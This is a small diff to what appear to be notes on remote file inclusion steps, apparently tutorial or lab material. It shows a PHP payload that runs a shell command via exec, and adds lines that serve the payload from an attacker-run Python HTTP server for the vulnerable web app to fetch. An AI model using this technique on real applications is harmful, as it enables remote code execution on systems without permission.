@@ -110,7 +110,11 @@ RFI steps
     <?php
     print exec('hostname');
     ?>
+
+    $ python3 -m http.server
+    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
     ```
-2. 
+2. The web app server will send a GET request to the malicious server to fetch the file.
+3. 
 
 
